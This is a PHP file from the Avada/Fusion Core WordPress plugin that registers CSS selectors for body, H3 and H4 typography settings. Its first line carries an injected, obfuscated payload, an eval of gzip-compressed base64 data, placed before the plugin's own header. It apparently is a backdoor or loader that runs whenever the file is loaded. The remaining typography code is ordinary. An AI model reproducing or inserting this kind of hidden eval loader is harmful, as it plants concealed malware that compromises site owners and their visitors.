<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * This file contains typography styles for Fusion Core plugin.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * CSS classes that inherit Avada's body typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_fusion_core_body_typography( $typography_elements ) {

	$typography_elements['size'][] = '.counter-box-content';
	$typography_elements['size'][] = '.fusion-alert';
	$typography_elements['size'][] = '.fusion-progressbar .progress-title';
	$typography_elements['family'][] = '.fusion-blog-shortcode .fusion-timeline-date';

	return $typography_elements;
}
add_filter( 'avada_body_typography_elements', 'avada_fusion_core_body_typography' );

/**
 * CSS classes that inherit Avada's H3 typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_fusion_core_h3_typography( $typography_elements ) {

	$typography_elements['size'][] = '.fusion-modal .modal-title';
	$typography_elements['color'][] = '.person-author-wrapper span';
	$typography_elements['family'][] = '.fusion-modal .modal-title';
	$typography_elements['family'][] = '.fusion-pricing-table .title-row';
	$typography_elements['family'][] = '.fusion-pricing-table .pricing-row';

	return $typography_elements;
}
add_filter( 'avada_h3_typography_elements', 'avada_fusion_core_h3_typography' );

/**
 * CSS classes that inherit Avada's H4 typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_fusion_core_h4_typography( $typography_elements ) {

	$typography_elements['size'][] = '.fusion-person .person-author-wrapper .person-name';
	$typography_elements['size'][] = '.fusion-person .person-author-wrapper .person-title';
	$typography_elements['size'][] = '.person-author-wrapper';
	$typography_elements['size'][] = '.popover .popover-title';
	$typography_elements['size'][] = '.fusion-flip-boxes .fusion-flip-box .flip-box-heading-back';
	$typography_elements['family'][] = '.popover .popover-title';
	$typography_elements['family'][] = '.fusion-flip-boxes .fusion-flip-box .flip-box-heading-back';
	$typography_elements['family'][] = '.fusion-tabs .nav-tabs  li .fusion-tab-heading';
	$typography_elements['family'][] = '.fusion-accordian .panel-heading a';
	$typography_elements['family'][] = '.fusion-person .person-desc .person-author .person-author-wrapper';

	return $typography_elements;
}
add_filter( 'avada_h4_typography_elements', 'avada_fusion_core_h4_typography' );

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
